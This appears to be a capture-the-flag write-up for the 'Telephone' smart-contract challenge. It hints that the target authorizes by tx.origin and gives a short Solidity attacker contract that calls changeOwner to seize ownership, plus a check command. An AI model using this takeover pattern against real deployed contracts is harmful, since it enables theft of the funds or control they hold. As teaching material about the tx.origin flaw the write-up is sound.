# Telephone

**HINT:** Your going to want to go to remix IDE and create a contract to hack the telephone contract. The contract uses tx.orgin as an authorization. Hence making it hackable if that helps any
<details>
<summary>Answer</summary>
<p>

```
pragma solidity ^0.4.18;

contract Telephone {
    function changeOwner(address _owner) public;
}

contract stealTelephone {

    function stealTelephon(address _telephone, address _owner) public {
        Telephone tel = Telephone(_telephone);
        tel.changeOwner(_owner);
    }    
}
```

You can then check using:
```js
await contract.owner()
```
</p>
</details>